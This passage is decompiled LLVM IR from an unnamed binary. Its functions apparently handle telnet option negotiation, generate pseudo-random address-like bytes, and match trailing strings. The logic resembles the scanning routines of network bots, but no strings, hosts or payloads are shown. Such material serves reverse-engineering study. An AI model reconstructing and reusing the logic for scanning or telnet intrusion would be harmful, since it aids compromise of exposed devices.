  store i32 4, i32* %stack_var_-188, align 4
  %v2_a560 = ptrtoint i32* %stack_var_-192 to i32
  %v2_a564 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a57c = call i32 @function_1494c(i32 %arg1, i32 1, i32 4, i32 %v2_a560, i32 %v2_a564)
  %v3_a580 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a580, i32* @r3, align 4
  %v2_a584 = icmp eq i32 %v3_a580, 0
  br i1 %v2_a584, label %dec_label_pc_a5b0, label %dec_label_pc_a58c

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a558
  br label %dec_label_pc_a5ec

dec_label_pc_a598:                                ; preds = %dec_label_pc_a4d4
  br label %dec_label_pc_a5ec

dec_label_pc_a5a4:                                ; preds = %dec_label_pc_a474
  br label %dec_label_pc_a5ec

dec_label_pc_a5b0:                                ; preds = %dec_label_pc_a434, %dec_label_pc_a558
  %v2_a5bc = call i32 @function_128a0(i32 %arg1, i32 3)
  %v1_a5cc = and i32 %v2_a5bc, -2049
  store i32 %v1_a5cc, i32* @r3, align 4
  %v2_a5e0 = call i32 @function_128a0(i32 %arg1, i32 4)
  br label %dec_label_pc_a5ec

dec_label_pc_a5ec:                                ; preds = %dec_label_pc_a5a4, %dec_label_pc_a598, %dec_label_pc_a58c, %dec_label_pc_a428, %dec_label_pc_a5b0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a598 ], [ 1, %dec_label_pc_a5b0 ], [ 0, %dec_label_pc_a58c ], [ 0, %dec_label_pc_a5a4 ], [ 0, %dec_label_pc_a428 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a498, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a5ec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a5b0, { 1, 0 }
  uselistorder label %dec_label_pc_a4ac, { 1, 0 }
}

define i32 @function_a600() local_unnamed_addr {
dec_label_pc_a600:
  %stack_var_-4 = alloca i32, align 4
  %v3_a604 = load i32, i32* @r4, align 4
  %v6_a604 = load i32, i32* @r5, align 4
  %v9_a604 = load i32, i32* @r6, align 4
  %v12_a604 = load i32, i32* @fp, align 4
  store i32 42508, i32* %stack_var_-4, align 4
  %v2_a608 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a608, i32* @fp, align 4
  %v0_a610 = call i32 @function_126e0()
  %v2_a620 = icmp eq i32 %v0_a610, 0
  br i1 %v2_a620, label %dec_label_pc_a78c, label %dec_label_pc_a634

dec_label_pc_a634:                                ; preds = %dec_label_pc_a600
  %v2_a638 = load i32, i32* @global_var_2c898.42, align 4
  %v5_a638 = load i32, i32* @global_var_2c89c.43, align 4
  %v2_a644 = add i32 %v2_a638, 1
  %v3_a644 = icmp eq i32 %v2_a644, 0
  %v4_a648 = zext i1 %v3_a644 to i32
  %v5_a648 = add i32 %v4_a648, %v5_a638
  store i32 %v2_a644, i32* @global_var_2c898.42, align 4
  store i32 %v5_a648, i32* @global_var_2c89c.43, align 4
  %v2_a664 = add i32 %v2_a638, 2
  %v3_a664 = icmp eq i32 %v2_a644, -1
  %v4_a668 = zext i1 %v3_a664 to i32
  %v5_a668 = add i32 %v5_a648, %v4_a668
  %v3_a66c = udiv i32 %v2_a664, 1073741824
  %v3_a670 = mul i32 %v5_a668, 4
  %v2_a674 = or i32 %v3_a670, %v3_a66c
  store i32 %v2_a674, i32* @r4, align 4
  %v3_a678 = mul i32 %v2_a664, 4
  %v1_a680 = call i32 @function_14ccc(i32 %v3_a678)
  br label %dec_label_pc_a6d8

dec_label_pc_a698:                                ; preds = %dec_label_pc_a6d8, %dec_label_pc_a724
  %v3_a69c = mul i32 %storemerge2, 4
  %v2_a6a8 = add i32 %v3_a69c, %v1_a680
  %v2_a6bc = load i32, i32* @global_var_32af8.45, align 4
  %v2_a6c0 = add i32 %v2_a6bc, %v3_a69c
  %v1_a6c4 = inttoptr i32 %v2_a6c0 to i32*
  %v2_a6c4 = load i32, i32* %v1_a6c4, align 4
  %v2_a6c8 = inttoptr i32 %v2_a6a8 to i32*
  store i32 %v2_a6c4, i32* %v2_a6c8, align 4
  %v1_a6d0 = add i32 %storemerge2, 1
  br label %dec_label_pc_a6d8

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a634, %dec_label_pc_a698
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a634 ], [ %v1_a6d0, %dec_label_pc_a698 ]
  %v2_a6f0 = load i32, i32* @global_var_2c898.42, align 4
  %v5_a6f0 = load i32, i32* @global_var_2c89c.43, align 4
  %v2_a704 = add i32 %v2_a6f0, -1
  %v3_a704 = icmp ne i32 %v2_a6f0, 0
  %v3_a708 = add i32 %v5_a6f0, -1
  %v5_a708 = sext i1 %v3_a704 to i32
  %v9_a71c = icmp eq i32 %v3_a708, %v5_a708
  br i1 %v9_a71c, label %dec_label_pc_a724, label %dec_label_pc_a698

dec_label_pc_a724:                                ; preds = %dec_label_pc_a6d8
  store i32 %v2_a704, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a704, %storemerge2
  br i1 %tmp, label %dec_label_pc_a698, label %dec_label_pc_a744

dec_label_pc_a744:                                ; preds = %dec_label_pc_a724
  store i32 %v5_a6f0, i32* @r4, align 4
  %v3_a74c = mul i32 %v2_a6f0, 4
  %v1_a750 = add i32 %v1_a680, -4
  %v2_a75c = add i32 %v1_a750, %v3_a74c
  %v2_a764 = inttoptr i32 %v2_a75c to i32*
  store i32 %v0_a610, i32* %v2_a764, align 4
  %v2_a76c = load i32, i32* @global_var_32af8.45, align 4
  store i32 %v2_a76c, i32* @r0, align 4
  %v0_a774 = call i32 @function_15850()
  store i32 %v1_a680, i32* @global_var_32af8.45, align 4
  br label %dec_label_pc_a78c

dec_label_pc_a78c:                                ; preds = %dec_label_pc_a600, %dec_label_pc_a744
  store i32 %v3_a604, i32* @r4, align 4
  store i32 %v6_a604, i32* @r5, align 4
  store i32 %v9_a604, i32* @r6, align 4
  store i32 %v12_a604, i32* @fp, align 4
  ret i32 %v0_a610

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a69c, { 1, 0 }
  uselistorder i32 %v1_a680, { 2, 0, 1 }
  uselistorder i32 %v2_a644, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a78c, { 1, 0 }
  uselistorder label %dec_label_pc_a6d8, { 1, 0 }
  uselistorder label %dec_label_pc_a698, { 1, 0 }
}

define i32 @function_a7a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a7a8:
  %stack_var_-17 = alloca i8, align 1
  %v1_a7c8 = add i32 %arg2, 1
  %v1_a7cc = inttoptr i32 %v1_a7c8 to i8*
  %v2_a7cc = load i8, i8* %v1_a7cc, align 1
  %v7_a7d8 = icmp ult i8 %v2_a7cc, -5
  br i1 %v7_a7d8, label %dec_label_pc_a924, label %dec_label_pc_a7e0

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7a8
  %v7_a7e8 = icmp eq i8 %v2_a7cc, -1
  br i1 %v7_a7e8, label %dec_label_pc_a7ec, label %dec_label_pc_a808

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a7e0
  br label %dec_label_pc_a924

dec_label_pc_a808:                                ; preds = %dec_label_pc_a7e0
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a810 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a824 = call i32 @function_149c8(i32 %arg1, i32 %v2_a810, i32 1, i32 16384)
  %v2_a830 = load i8, i8* %v1_a7cc, align 1
  %v7_a834 = icmp eq i8 %v2_a830, -4
  br i1 %v7_a834, label %dec_label_pc_a83c, label %dec_label_pc_a848

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a808
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a8e8

dec_label_pc_a848:                                ; preds = %dec_label_pc_a808
  %v2_a850 = load i8, i8* %v1_a7cc, align 1
  %v7_a854 = icmp eq i8 %v2_a850, -2
  br i1 %v7_a854, label %dec_label_pc_a85c, label %dec_label_pc_a868

dec_label_pc_a85c:                                ; preds = %dec_label_pc_a848
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a8e8

dec_label_pc_a868:                                ; preds = %dec_label_pc_a848
  %v2_a870 = load i8, i8* %v1_a7cc, align 1
  %v7_a874 = icmp eq i8 %v2_a870, 3
  %v7_a888 = icmp eq i8 %v2_a870, -3
  br i1 %v7_a874, label %dec_label_pc_a87c, label %dec_label_pc_a8b4

dec_label_pc_a87c:                                ; preds = %dec_label_pc_a868
  br i1 %v7_a888, label %dec_label_pc_a890, label %dec_label_pc_a89c

dec_label_pc_a890:                                ; preds = %dec_label_pc_a87c
  br label %dec_label_pc_a8a4

dec_label_pc_a89c:                                ; preds = %dec_label_pc_a87c
  br label %dec_label_pc_a8a4

dec_label_pc_a8a4:                                ; preds = %dec_label_pc_a890, %dec_label_pc_a89c
  %storemerge = phi i8 [ -3, %dec_label_pc_a89c ], [ -5, %dec_label_pc_a890 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a8e8

dec_label_pc_a8b4:                                ; preds = %dec_label_pc_a868
  br i1 %v7_a888, label %dec_label_pc_a8c8, label %dec_label_pc_a8d4

dec_label_pc_a8c8:                                ; preds = %dec_label_pc_a8b4
  br label %dec_label_pc_a8dc

dec_label_pc_a8d4:                                ; preds = %dec_label_pc_a8b4
  br label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8c8, %dec_label_pc_a8d4
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a8d4 ], [ -4, %dec_label_pc_a8c8 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a8e8

dec_label_pc_a8e8:                                ; preds = %dec_label_pc_a8a4, %dec_label_pc_a85c, %dec_label_pc_a83c, %dec_label_pc_a8dc
  %v4_a8fc = call i32 @function_149c8(i32 %arg1, i32 %v2_a810, i32 1, i32 16384)
  %v1_a904 = add i32 %arg2, 2
  %v4_a918 = call i32 @function_149c8(i32 %arg1, i32 %v1_a904, i32 1, i32 16384)
  br label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a7ec, %dec_label_pc_a8e8, %dec_label_pc_a7a8
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a924, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a8e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a8dc, { 1, 0 }
  uselistorder label %dec_label_pc_a8a4, { 1, 0 }
}

define i32 @function_a938(i32 %arg1) local_unnamed_addr {
dec_label_pc_a938:
  store i32 %arg1, i32* @r0, align 4
  %v0_a958 = call i32 @function_13f70()
  %v2_a9a0 = add i32 %v0_a958, %arg1
  br label %dec_label_pc_aa74

dec_label_pc_a978:                                ; preds = %dec_label_pc_aa00, %dec_label_pc_a9dc, %dec_label_pc_a9b8, %dec_label_pc_a994
  %v1_a97c = add nsw i32 %stack_var_-28.014, 1
  %v7_a990 = icmp sgt i32 %v0_a958, %v1_a97c
  br i1 %v7_a990, label %dec_label_pc_a994, label %dec_label_pc_aa24

dec_label_pc_a994:                                ; preds = %dec_label_pc_a984.preheader, %dec_label_pc_a978
  %stack_var_-28.014 = phi i32 [ %v1_a97c, %dec_label_pc_a978 ], [ %stack_var_-28.1, %dec_label_pc_a984.preheader ]
  %v2_a9a8 = sub i32 %v2_a9a0, %stack_var_-28.014
  %v1_a9ac = inttoptr i32 %v2_a9a8 to i8*
  %v2_a9ac = load i8, i8* %v1_a9ac, align 1
  %v2_a9b0 = icmp eq i8 %v2_a9ac, 0
  br i1 %v2_a9b0, label %dec_label_pc_a978, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a994
  %v2_a9d0 = load i8, i8* %v1_a9ac, align 1
  %v7_a9d4 = icmp eq i8 %v2_a9d0, 32
  br i1 %v7_a9d4, label %dec_label_pc_a978, label %dec_label_pc_a9dc

dec_label_pc_a9dc:                                ; preds = %dec_label_pc_a9b8
  %v2_a9f4 = load i8, i8* %v1_a9ac, align 1
  %v7_a9f8 = icmp eq i8 %v2_a9f4, 13
  br i1 %v7_a9f8, label %dec_label_pc_a978, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9dc
  %v2_aa18 = load i8, i8* %v1_a9ac, align 1
  %v7_aa1c = icmp eq i8 %v2_aa18, 10
  br i1 %v7_aa1c, label %dec_label_pc_a978, label %dec_label_pc_aa24

dec_label_pc_aa24:                                ; preds = %dec_label_pc_aa00, %dec_label_pc_a978, %dec_label_pc_a984.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a984.preheader ], [ %stack_var_-28.014, %dec_label_pc_aa00 ], [ %v1_a97c, %dec_label_pc_a978 ]
  %v2_aa38 = sub i32 %v2_a9a0, %stack_var_-28.0.lcssa
  %v1_aa3c = inttoptr i32 %v2_aa38 to i8*
  %v2_aa3c = load i8, i8* %v1_aa3c, align 1
  %v2_aa4c = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_21320.47 to i32)
  %v1_aa50 = inttoptr i32 %v2_aa4c to i8*
  %v2_aa50 = load i8, i8* %v1_aa50, align 1
  %v9_aa54 = icmp eq i8 %v2_aa3c, %v2_aa50
  %v1_aa6c = add i32 %storemerge3, 1
  br i1 %v9_aa54, label %dec_label_pc_aa94, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa24, %dec_label_pc_a938
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_a938 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_aa24 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_a938 ], [ %v1_aa6c, %dec_label_pc_aa24 ]
  store i32 ptrtoint ([6 x i8]* @global_var_21320.47 to i32), i32* @r0, align 4
  %v0_aa7c = call i32 @function_13f70()
  %v3_aa84 = icmp ult i32 %storemerge3, %v0_aa7c
  br i1 %v3_aa84, label %dec_label_pc_a984.preheader, label %dec_label_pc_aa94

dec_label_pc_a984.preheader:                      ; preds = %dec_label_pc_aa74
  %v7_a99013 = icmp sgt i32 %v0_a958, %stack_var_-28.1
  br i1 %v7_a99013, label %dec_label_pc_a994, label %dec_label_pc_aa24

dec_label_pc_aa94:                                ; preds = %dec_label_pc_aa74, %dec_label_pc_aa24
  %storemerge4 = phi i32 [ 1, %dec_label_pc_aa24 ], [ 0, %dec_label_pc_aa74 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v0_a958, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_21320.47 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_aa24, { 2, 0, 1 }
}

define i32 @function_aaac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_aaac:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_aab0 = load i32, i32* @fp, align 4
  store i32 %v3_aab0, i32* %stack_var_-16, align 4
  %v13_aab0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_ab00 = ptrtoint i32* %stack_var_-168 to i32
  %v3_ab40 = udiv i32 %arg1, 32
  %v3_ab4c = mul nuw nsw i32 %v3_ab40, 4
  %v1_ab64 = urem i32 %arg1, 32
  %v6_ab6c = shl i32 1, %v1_ab64
  %v1_ab90 = add i32 %arg1, 1
  %v2_ab98 = ptrtoint i32* %stack_var_-176 to i32
  %v6_acb8 = inttoptr i32 %arg2 to i8*
  %v2_accc = icmp eq i32 %arg3, 0
  %v5_ad1c = icmp sgt i32 %arg5, 0
  %v2_ab54 = add nsw i32 %v3_ab4c, -152
  %v2_ab58 = add i32 %v2_ab54, %v13_aab0
  %v1_ab5c = inttoptr i32 %v2_ab58 to i32*
  br label %dec_label_pc_acf4

dec_label_pc_ab14.lr.ph:                          ; preds = %dec_label_pc_ad08, %dec_label_pc_ad14
  br label %dec_label_pc_ab14

dec_label_pc_ab14:                                ; preds = %dec_label_pc_ab14.lr.ph, %dec_label_pc_ab14
  %storemerge27 = phi i32 [ 0, %dec_label_pc_ab14.lr.ph ], [ %v1_ab28, %dec_label_pc_ab14 ]
  %v5_ab20 = mul nuw nsw i32 %storemerge27, 4
  %v6_ab20 = add i32 %v5_ab20, %v2_ab00
  %v7_ab20 = inttoptr i32 %v6_ab20 to i32*
  store i32 0, i32* %v7_ab20, align 4
  %v1_ab28 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_ab28, 32
  br i1 %tmp30, label %dec_label_pc_ab14, label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab14
  %v2_ab5c = load i32, i32* %v1_ab5c, align 4
  %v2_ab70 = or i32 %v2_ab5c, %v6_ab6c
  store i32 %v2_ab70, i32* %v1_ab5c, align 4
  %v5_abac = call i32 @function_12764(i32 %v1_ab90, i32 %v2_ab00, i32 0, i32 0, i32 %v2_ab98)
  %tmp31 = icmp slt i32 %v5_abac, 1
  br i1 %tmp31, label %dec_label_pc_ad38, label %dec_label_pc_abbc

dec_label_pc_abbc:                                ; preds = %dec_label_pc_ab3c
  %v2_abc8 = add i32 %stack_var_-40.0, %arg6
  %v5_abcc = inttoptr i32 %v2_abc8 to i8*
  %v6_abe0 = call i32 @function_14990(i32 %arg1, i32 %v2_abc8, i32 1, i32 0)
  %v7_abf0 = icmp eq i32 %v6_abe0, -1
  br i1 %v7_abf0, label %dec_label_pc_ac04, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %dec_label_pc_abbc
  %v2_abfc = icmp eq i32 %v6_abe0, 0
  br i1 %v2_abfc, label %dec_label_pc_ac04, label %dec_label_pc_ac10

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abf8, %dec_label_pc_abbc
  br label %dec_label_pc_ad40

dec_label_pc_ac10:                                ; preds = %dec_label_pc_abf8
  %v2_ac18 = add i32 %v6_abe0, %stack_var_-40.0
  %v2_ac24 = load i8, i8* %v5_abcc, align 1
  %v2_ac28 = icmp eq i8 %v2_ac24, -1
  br i1 %v2_ac28, label %dec_label_pc_ac30, label %dec_label_pc_acb0

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac10
  %v1_ac34 = add i32 %v2_abc8, 1
  %v5_ac48 = call i32 @function_14990(i32 %arg1, i32 %v1_ac34, i32 2, i32 0)
  %v7_ac58 = icmp eq i32 %v5_ac48, -1
  br i1 %v7_ac58, label %dec_label_pc_ac6c, label %dec_label_pc_ac60

dec_label_pc_ac60:                                ; preds = %dec_label_pc_ac30
  %v2_ac64 = icmp eq i32 %v5_ac48, 0
  br i1 %v2_ac64, label %dec_label_pc_ac6c, label %dec_label_pc_ac78

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac60, %dec_label_pc_ac30
  br label %dec_label_pc_ad40

dec_label_pc_ac78:                                ; preds = %dec_label_pc_ac60
  %v2_ac80 = add i32 %v5_ac48, %v2_ac18
  %v5_ac94 = call i32 @function_a7a8(i32 %arg1, i32 %v2_abc8, i32 3, i32 %v2_ac80, i32 %v2_ac80)
  %v2_ac9c = icmp eq i32 %v5_ac94, 0
  br i1 %v2_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_acf4

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac78
  br label %dec_label_pc_ad40

dec_label_pc_acb0:                                ; preds = %dec_label_pc_ac10
  %v7_acb8 = call i32 @function_14020(i32 %arg6, i8* %v6_acb8)
  %v2_acc0 = icmp eq i32 %v7_acb8, 0
  br i1 %v2_acc0, label %dec_label_pc_acc8, label %dec_label_pc_ad2c

dec_label_pc_acc8:                                ; preds = %dec_label_pc_acb0
  br i1 %v2_accc, label %dec_label_pc_acf4, label %dec_label_pc_acd4

dec_label_pc_acd4:                                ; preds = %dec_label_pc_acc8
  %v1_acd8 = call i32 @function_a938(i32 %arg6)
  %v2_ace0 = icmp eq i32 %v1_acd8, 0
  br i1 %v2_ace0, label %dec_label_pc_acf4, label %dec_label_pc_ad2c

dec_label_pc_acf4:                                ; preds = %dec_label_pc_ac78, %dec_label_pc_acd4, %dec_label_pc_acc8, %dec_label_pc_aaac
  %stack_var_-40.0 = phi i32 [ %arg8, %dec_label_pc_aaac ], [ %v2_ac80, %dec_label_pc_ac78 ], [ %v2_ac18, %dec_label_pc_acc8 ], [ %v2_ac18, %dec_label_pc_acd4 ]
  %v1_acf8 = add i32 %stack_var_-40.0, 2
  %v6_ad04 = icmp slt i32 %v1_acf8, %arg7
  br i1 %v6_ad04, label %dec_label_pc_ad08, label %dec_label_pc_ad38

dec_label_pc_ad08:                                ; preds = %dec_label_pc_acf4
  %v3_ad08 = load i32, i32* %stack_var_-176, align 4
  %v5_ad10 = icmp sgt i32 %v3_ad08, 0
  br i1 %v5_ad10, label %dec_label_pc_ab14.lr.ph, label %dec_label_pc_ad14

dec_label_pc_ad14:                                ; preds = %dec_label_pc_ad08
  br i1 %v5_ad1c, label %dec_label_pc_ab14.lr.ph, label %dec_label_pc_ad38

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_acb0, %dec_label_pc_acd4
  br label %dec_label_pc_ad40

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ab3c, %dec_label_pc_ad14, %dec_label_pc_acf4
  br label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad2c, %dec_label_pc_aca4, %dec_label_pc_ac6c, %dec_label_pc_ac04, %dec_label_pc_ad38
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_ad38 ], [ 1, %dec_label_pc_ad2c ], [ 0, %dec_label_pc_ac04 ], [ 0, %dec_label_pc_ac6c ], [ 0, %dec_label_pc_aca4 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_ac48, { 1, 2, 0 }
  uselistorder i32 %v6_abe0, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_ab00, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_a7a8, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_ad40, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ad38, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ad2c, { 1, 0 }
  uselistorder label %dec_label_pc_acf4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ab14, { 1, 0 }
  uselistorder label %dec_label_pc_ab14.lr.ph, { 1, 0 }
}

define i32 @function_ad54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ad54:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ad58 = load i32, i32* @fp, align 4
  store i32 44384, i32* %stack_var_-4, align 4
  %v2_ad5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ad5c, i32* @fp, align 4
  store i8 0, i8* bitcast (i32* @global_var_2c8a7.50 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_2c8a8.51 to i8*), align 4
  store i8 0, i8* @global_var_2c8a9.52, align 1
  store i8 0, i8* @global_var_2c8aa.53, align 1
  %v6_ad94 = call i32 @function_15bf4(i32 %arg1, i32 %arg2, i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), i32 0, i32 ptrtoint (i32* @0 to i32))
  %v2_adb0 = sdiv i32 %v6_ad94, 51
  %tmp258 = mul i32 %v2_adb0, -255
  %v2_adc8 = add i32 %tmp258, %v6_ad94
  %v2_add4 = trunc i32 %v2_adc8 to i8
  store i8 %v2_add4, i8* bitcast (i32* @global_var_2c8a7.50 to i8*), align 4
  %v6_ade0 = call i32 @function_15bf4(i32 %v6_ad94, i32 %v2_adb0, i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), i32 %v2_adc8, i32 ptrtoint (i32* @0 to i32))
  %v2_adfc = sdiv i32 %v6_ade0, 51
  %tmp259 = mul i32 %v2_adfc, -255
  %v2_ae14 = add i32 %tmp259, %v6_ade0
  %v2_ae20 = trunc i32 %v2_ae14 to i8
  store i8 %v2_ae20, i8* bitcast (i32* @global_var_2c8a8.51 to i8*), align 4
  %v6_ae2c = call i32 @function_15bf4(i32 %v6_ade0, i32 %v2_adfc, i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), i32 %v2_ae14, i32 ptrtoint (i32* @0 to i32))
  %v2_ae48 = sdiv i32 %v6_ae2c, 51
  %tmp260 = mul i32 %v2_ae48, -255
  %v2_ae60 = add i32 %tmp260, %v6_ae2c
  %v2_ae6c = trunc i32 %v2_ae60 to i8
  store i8 %v2_ae6c, i8* @global_var_2c8a9.52, align 1
  %v6_ae78 = call i32 @function_15bf4(i32 %v6_ae2c, i32 %v2_ae48, i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), i32 %v2_ae60, i32 ptrtoint (i32* @0 to i32))
  %v2_ae94 = sdiv i32 %v6_ae78, 51
  %tmp261 = mul i32 %v2_ae94, -255
  %v2_aeac = add i32 %tmp261, %v6_ae78
  %v2_aeb8 = trunc i32 %v2_aeac to i8
  store i8 %v2_aeb8, i8* @global_var_2c8aa.53, align 1
  %v6_aec4 = call i32 @function_15bf4(i32 %v6_ae78, i32 %v2_ae94, i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), i32 %v2_aeac, i32 ptrtoint (i32* @0 to i32))
  %v2_aee0 = sdiv i32 %v6_aec4, 50
  %tmp262 = mul i32 %v2_aee0, -247
  %v2_aef8 = add i32 %tmp262, %v6_aec4
  %v2_af04 = icmp eq i32 %v2_aef8, 0
  br i1 %v2_af04, label %dec_label_pc_af0c, label %dec_label_pc_af34

dec_label_pc_af0c:                                ; preds = %dec_label_pc_ad54
  %v2_af0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_af18 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_af24 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_af30 = sext i8 %v3_af18 to i32
  %v6_af30 = sext i8 %v3_af24 to i32
  %v8_af30 = call i32 @function_92f8(i32 %v2_af0c, i32 ptrtoint ([11 x i8]* @global_var_21328.57 to i32), i32 %v4_af30, i32 %v6_af30, i32 0)
  br label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_af0c
  %v7_af38 = icmp eq i32 %v2_aef8, 1
  br i1 %v7_af38, label %dec_label_pc_af40, label %dec_label_pc_af68

dec_label_pc_af40:                                ; preds = %dec_label_pc_af34
  %v2_af40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af4c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_af58 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_af64 = sext i8 %v3_af4c to i32
  %v6_af64 = sext i8 %v3_af58 to i32
  %v8_af64 = call i32 @function_92f8(i32 %v2_af40, i32 ptrtoint ([12 x i8]* @global_var_21334.59 to i32), i32 %v4_af64, i32 %v6_af64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af68

dec_label_pc_af68:                                ; preds = %dec_label_pc_af34, %dec_label_pc_af40
  %v7_af6c = icmp eq i32 %v2_aef8, 2
  br i1 %v7_af6c, label %dec_label_pc_af74, label %dec_label_pc_af9c

dec_label_pc_af74:                                ; preds = %dec_label_pc_af68
  %v2_af74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af80 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_af8c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_af98 = sext i8 %v3_af80 to i32
  %v6_af98 = sext i8 %v3_af8c to i32
  %v8_af98 = call i32 @function_92f8(i32 %v2_af74, i32 ptrtoint ([12 x i8]* @global_var_21340.61 to i32), i32 %v4_af98, i32 %v6_af98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af9c

dec_label_pc_af9c:                                ; preds = %dec_label_pc_af68, %dec_label_pc_af74
  %v7_afa0 = icmp eq i32 %v2_aef8, 3
  br i1 %v7_afa0, label %dec_label_pc_afa8, label %dec_label_pc_afd0

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af9c
  %v2_afa8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afb4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_afc0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_afcc = sext i8 %v3_afb4 to i32
  %v6_afcc = sext i8 %v3_afc0 to i32
